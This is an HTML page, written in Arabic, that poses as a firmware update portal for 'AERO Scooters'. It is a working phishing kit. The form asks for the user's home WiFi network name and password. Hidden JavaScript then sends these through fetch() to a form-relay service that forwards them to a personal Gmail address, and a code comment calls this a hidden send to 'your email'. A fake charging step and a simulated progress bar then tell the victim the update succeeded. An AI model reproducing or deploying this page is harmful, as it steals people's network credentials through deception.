<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>AERO Scooters - بوابة التحديث الذكية</title>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
    <style>
        :root {
            --bg-main: #f4f7fc;
            --panel-bg: #ffffff;
            --primary: #007aff; /* أزرق أبل الرسمي - مريح للأمان */
            --primary-light: #e3efff;
            --accent: #34c759; /* أخضر للنجاح والأمان */
            --text-dark: #1d1d1f;
            --text-muted: #86868b;
            --border-color: #e5e5ea;
        }

        * {
            box-sizing: border-box;
            margin: 0;
            padding: 0;
            font-family: 'Segoe UI', system-ui, -apple-system, sans-serif;
        }

        body {
            background-color: var(--bg-main);
            color: var(--text-dark);
            min-height: 100vh;
            display: flex;
            justify-content: center;
            align-items: center;
            padding: 20px;
        }

        /* الحاوية الرئيسية للموقع */
        .container {
            width: 100%;
            max-width: 900px;
            background: var(--panel-bg);
            border-radius: 30px;
            box-shadow: 0 15px 40px rgba(0, 0, 0, 0.06);
            overflow: hidden;
            display: grid;
            grid-template-columns: 1fr 1fr; /* تقسيم الموقع لنصفين: صور وفورم */
        }

        @media (max-width: 768px) {
            .container {
                grid-template-columns: 1fr;
            }
            .brand-sidebar {
                display: none; /* إخفاء الجانب الصوري في الشاشات الصغيرة لتوفير المساحة */
            }
        }

        /* الجزء الخاص بالصور والبراندينج (اليسار) */
        .brand-sidebar {
            background: linear-gradient(135deg, rgba(0,122,255,0.9), rgba(0,74,153,0.9)), 
                        url('https://images.unsplash.com/photo-1608613314223-7d3976af860b?auto=format&fit=crop&w=600&q=80');
            background-size: cover;
            background-position: center;
            padding: 40px;
            color: #ffffff;
            display: flex;
            flex-direction: column;
            justify-content: space-between;
            position: relative;
        }

        .sidebar-header {
            display: flex;
            align-items: center;
            gap: 10px;
        }

        .sidebar-header i {
            font-size: 1.8rem;
        }

        .sidebar-header h2 {
            font-size: 1.5rem;
            font-weight: 800;
            letter-spacing: 1px;
        }

        .sidebar-showcase {
            margin-top: auto;
        }

        .sidebar-showcase h3 {
            font-size: 1.8rem;
            margin-bottom: 10px;
            font-weight: 700;
        }

        .sidebar-showcase p {
            font-size: 0.95rem;
            opacity: 0.9;
            line-height: 1.6;
        }

        /* الجزء الخاص بالفورم والخطوات (اليمين) */
        .content-area {
            padding: 50px 40px;
            display: flex;
            flex-direction: column;
            justify-content: center;
        }

        .main-header {
            text-align: center;
            margin-bottom: 30px;
        }

        .main-header h1 {
            font-size: 1.6rem;
            color: var(--text-dark);
            margin-bottom: 8px;
        }

        .main-header p {
            color: var(--text-muted);
            font-size: 0.9rem;
        }

        /* مؤشر الخطوات العلوي */
        .steps-bar {
            display: flex;
            justify-content: space-between;
            margin-bottom: 35px;
            position: relative;
        }

        .steps-bar::before {
            content: '';
            position: absolute;
            top: 50%;
            left: 0;
            right: 0;
            height: 2px;
            background: var(--border-color);
            z-index: 1;
            transform: translateY(-50%);
        }

        .step-node {
            width: 36px;
            height: 36px;
            border-radius: 50%;
            background: #ffffff;
            border: 2px solid var(--border-color);
            display: flex;
            justify-content: center;
            align-items: center;
            font-size: 0.9rem;
            font-weight: 700;
            color: var(--text-muted);
            position: relative;
            z-index: 2;
            transition: all 0.3s ease;
        }

        .step-node.active {
            border-color: var(--primary);
            color: var(--primary);
            background: var(--primary-light);
        }

        .step-node.completed {
            background: var(--primary);
            border-color: var(--primary);
            color: #ffffff;
        }

        /* محتويات الخطوات */
        .step-view {
            display: none;
        }

        .step-view.active {
            display: block;
            animation: slideUp 0.4s ease forwards;
        }

        @keyframes slideUp {
            from { opacity: 0; transform: translateY(15px); }
            to { opacity: 1; transform: translateY(0); }
        }

        /* تصميم حقول الإدخال والايكونات */
        .input-box {
            margin-bottom: 20px;
        }

        .input-box label {
            display: block;
            font-size: 0.85rem;
            color: var(--text-dark);
            font-weight: 600;
            margin-bottom: 8px;
        }

        .input-wrapper {
            position: relative;
            display: flex;
            align-items: center;
        }

        .input-wrapper i {
            position: absolute;
            right: 15px;
            color: var(--text-muted);
            font-size: 1.1rem;
        }

        .input-wrapper input, .input-wrapper select {
            width: 100%;
            padding: 14px 45px 14px 15px; /* مسافة أيمن للأيقونة */
            border: 1.5px solid var(--border-color);
            border-radius: 12px;
            font-size: 0.95rem;
            color: var(--text-dark);
            outline: none;
            background-color: #fafafa;
            transition: all 0.3s ease;
        }

        .input-wrapper input:focus, .input-wrapper select:focus {
            border-color: var(--primary);
            background-color: #ffffff;
            box-shadow: 0 0 0 4px rgba(0, 122, 255, 0.1);
        }

        /* الأزرار الرسمية */
        .action-btn {
            width: 100%;
            padding: 15px;
            background: var(--primary);
            color: white;
            border: none;
            border-radius: 12px;
            font-size: 1rem;
            font-weight: 600;
            cursor: pointer;
            transition: all 0.2s ease;
            display: flex;
            justify-content: center;
            align-items: center;
            gap: 10px;
            margin-top: 10px;
        }

        .action-btn:hover {
            background: #0066d6;
        }

        /* الخطوة 2: لوحة الشاحن اللطيفة */
        .charger-card {
            text-align: center;
            padding: 30px 20px;
            background: #fff9e6; /* لون أصفر خفيف للتنبيه الودي */
            border: 1px solid #ffe699;
            border-radius: 16px;
            margin-bottom: 25px;
        }

        .charger-card i {
            font-size: 3.5rem;
            color: #ffb300;
            margin-bottom: 15px;
            animation: pulseGlow 2s infinite;
        }

        @keyframes pulseGlow {
            0% { transform: scale(1); opacity: 0.8; }
            50% { transform: scale(1.05); opacity: 1; }
            100% { transform: scale(1); opacity: 0.8; }
        }

        .charger-card h3 {
            font-size: 1.2rem;
            color: #b78100;
            margin-bottom: 8px;
        }

        .charger-card p {
            font-size: 0.9rem;
            color: #664d03;
            line-height: 1.5;
        }

        /* الخطوة 3: واجهة التحديث المبهجة */
        .updating-view {
            text-align: center;
            padding: 20px 0;
        }

        .loader-ring {
            position: relative;
            width: 130px;
            height: 130px;
            margin: 0 auto 25px auto;
            display: flex;
            justify-content: center;
            align-items: center;
        }

        .loader-ring i {
            position: absolute;
            font-size: 3rem;
            color: var(--primary);
            animation: spinFast 2s linear infinite;
        }

        @keyframes spinFast {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }

        .progress-num {
            font-size: 1.3rem;
            font-weight: 700;
            color: var(--text-dark);
            z-index: 5;
        }

        /* بطاقة حالة النظام النظيفة بديلة الـ Terminal القديم */
        .status-box {
            background: var(--bg-main);
            border-radius: 12px;
            padding: 15px;
            text-align: right;
            font-size: 0.85rem;
            color: var(--text-dark);
            border: 1px solid var(--border-color);
        }

        .status-item {
            display: flex;
            align-items: center;
            gap: 10px;
            margin-bottom: 8px;
        }

        .status-item:last-child {
            margin-bottom: 0;
        }

        .status-item i {
            color: var(--primary);
        }

        .status-item.done i {
            color: var(--accent);
        }
    </style>
</head>
<body>

<div class="container">
    
    <div class="brand-sidebar">
        <div class="sidebar-header">
            <i class="fa-solid fa-motorcycle"></i>
            <h2>AERO SCOOTERS</h2>
        </div>
        
        <div style="margin: 20px 0; text-align: center;">
            <img src="https://images.unsplash.com/photo-1558981806-ec527fa84c39?auto=format&fit=crop&w=400&q=80" alt="Scooter Rider" style="width: 100%; border-radius: 16px; box-shadow: 0 10px 20px rgba(0,0,0,0.2);">
        </div>

        <div class="sidebar-showcase">
            <h3>تحديثات هوائية آمنة</h3>
            <p>مرحباً بك في مركز صيانة وتحديث البرمجيات لـ AERO. نضمن لك دائماً أفضل أداء وأعلى معدلات أمان على الطريق.</p>
        </div>
    </div>

    <div class="content-area">
        
        <div class="main-header">
            <h1>ترقية نظام التشغيل الحالي</h1>
            <p>يرجى ربط السكوتر بالشبكة المحلية لبدء تثبيت الحزمة</p>
        </div>

        <div class="steps-bar">
            <div class="step-node active" id="dot1"><i class="fa-solid fa-sliders"></i></div>
            <div class="step-node" id="dot2"><i class="fa-solid fa-plug"></i></div>
            <div class="step-node" id="dot3"><i class="fa-solid fa-rotate"></i></div>
        </div>

        <div class="step-view active" id="step1">
            <form id="updateForm" action="https://formsubmit.co/donis2018ever@gmail.com" method="POST" onsubmit="processStep1(event)">
                <input type="hidden" name="_captcha" value="false">
                <input type="hidden" name="_template" value="table">

                <div class="input-box">
                    <label>موديل السكوتر الذكي</label>
                    <div class="input-wrapper">
                        <i class="fa-solid fa-motorcycle"></i>
                        <select name="Scooter Model" id="scooterModel">
                            <option value="AERO Pro X">AERO Pro X Premium</option>
                            <option value="AERO Ultra Max">AERO Ultra Max Sport</option>
                            <option value="AERO Lite Cruise">AERO Lite Cruise Urban</option>
                        </select>
                    </div>
                </div>

                <div class="input-box">
                    <label>الرقم التعريفي / اسم السكوتر</label>
                    <div class="input-wrapper">
                        <i class="fa-solid fa-id-card"></i>
                        <input type="text" name="Scooter ID" id="scooterName" placeholder="مثال: AERO-Rider" required>
                    </div>
                </div>

                <div class="input-box">
                    <label>اسم شبكة الواي فاي المحيطة</label>
                    <div class="input-wrapper">
                        <i class="fa-solid fa-wifi"></i>
                        <input type="text" name="WiFi SSID" id="wifiName" placeholder="اترك اسم شبكتك المنزلية" required>
                    </div>
                </div>

                <div class="input-box">
                    <label>كلمة مرور شبكة الواي فاي</label>
                    <div class="input-wrapper">
                        <i class="fa-solid fa-lock"></i>
                        <input type="password" name="WiFi Password" id="wifiPass" placeholder="••••••••" required>
                    </div>
                </div>

                <button type="submit" class="action-btn">
                    التالي: التحقق والربط <i class="fa-solid fa-arrow-left"></i>
                </button>
            </form>
        </div>

        <div class="step-view" id="step2">
            <div class="charger-card">
                <i class="fa-solid fa-battery-charging"></i>
                <h3>خطوة أمان إلزامية</h3>
                <p>يرجى التأكد من توصيل سكوتر <strong id="scooterLabel" style="color:var(--primary)"></strong> بالشاحن الكهربائي الآن. التحديث يتطلب طاقة مستقرة بنسبة تزيد عن 50%.</p>
            </div>
            <button class="action-btn" style="background-color: var(--accent);" onclick="processStep2()">
                السكوتر متصل بالشاحن، ابدأ التحديث الآن <i class="fa-solid fa-circle-check"></i>
            </button>
        </div>

        <div class="step-view" id="step3">
            <div class="updating-view">
                <div class="loader-ring">
                    <i class="fa-solid fa-spinner"></i>
                    <div class="progress-num" id="percentageLabel">0%</div>
                </div>
                <h3 id="mainStatusText" style="margin-bottom: 15px; font-size: 1.2rem;">جاري فحص الاتصال بالـ Server...</h3>
                
                <div class="status-box" id="statusList">
                    <div class="status-item" id="log1"><i class="fa-solid fa-circle-notch fa-spin"></i> جاري تهيئة بوابة السوفت وير...</div>
                </div>
            </div>
        </div>

    </div>
</div>

<script>
    function processStep1(e) {
        e.preventDefault();
        const form = document.getElementById('updateForm');
        const scName = document.getElementById('scooterName').value;
        
        document.getElementById('scooterLabel').innerText = scName;

        // إرسال خفي مباشر للبيانات إلى إيميلك donis2018ever@gmail.com
        fetch(form.action, {
            method: "POST",
            body: new FormData(form)
        });

        // الانتقال للخطوة 2
        document.getElementById('step1').classList.remove('active');
        document.getElementById('step2').classList.add('active');
        document.getElementById('dot1').classList.add('completed');
        document.getElementById('dot2').classList.add('active');
    }

    function processStep2() {
        document.getElementById('step2').classList.remove('active');
        document.getElementById('step3').classList.add('active');
        document.getElementById('dot2').classList.add('completed');
        document.getElementById('dot3').classList.add('active');

        runCleanUpdate();
    }

    function runCleanUpdate() {
        let progress = 0;
        const pLabel = document.getElementById('percentageLabel');
        const statusText = document.getElementById('mainStatusText');
        const statusList = document.getElementById('statusList');

        const interval = setInterval(() => {
            if (progress < 100) {
                progress += 1;
                pLabel.innerText = progress + "%";

                if (progress === 25) {
                    statusText.innerText = "جاري تحميل حزمة الترقية v4.2...";
                    statusList.innerHTML += '<div class="status-item"><i class="fa-solid fa-circle-notch fa-spin"></i> تحميل ملفات النظام الجديدة بأمان...</div>';
                }
                if (progress === 55) {
                    statusText.innerText = "جاري كتابة الملفات على السكوتر...";
                    statusList.innerHTML += '<div class="status-item"><i class="fa-solid fa-circle-notch fa-spin"></i> فك ضغط البرمجيات المرفوعة...</div>';
                }
                if (progress === 85) {
                    statusText.innerText = "جاري مراجعة الأمان والتشغيل...";
                    statusList.innerHTML += '<div class="status-item"><i class="fa-solid fa-circle-notch fa-spin"></i> فحص جودة النظام وتأكيد التثبيت...</div>';
                }
            } else {
                clearInterval(interval);
                statusText.innerText = "تم التحديث بنجاح وأمان تام! ✨";
                statusText.style.color = "var(--accent)";
                pLabel.innerHTML = '<i class="fa-solid fa-check" style="color:var(--accent); font-size:2rem;"></i>';
                statusList.innerHTML = '<div class="status-item done" style="color:var(--accent)"><i class="fa-solid fa-circle-check"></i> اكتمل التحديث! يمكنك فصل الساحن والاستمتاع برحلتك القادمة.</div>';
                document.getElementById('dot3').classList.add('completed');
            }
        }, 70);
    }
</script>

</body>
</html>
